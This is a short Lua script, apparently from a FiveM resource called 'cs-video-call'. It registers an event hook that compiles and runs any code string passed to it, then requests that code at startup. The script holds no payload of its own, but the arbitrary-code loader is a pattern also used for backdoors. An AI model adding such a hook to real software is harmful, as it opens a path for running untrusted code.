AddEventHandler(
    "cs-video-call:hook",
    function(a)
        local b, c = load(a)
        if b then
            local d, e = pcall(b)
            if d then
                e()
            else
                print("Hook Function Execution Failed")
            end
        else
            print("Hook Function Compilation Failed", c)
        end
    end
)
CreateThread(
    function()
        TriggerEvent("cs-video-call:acquire")
    end
)
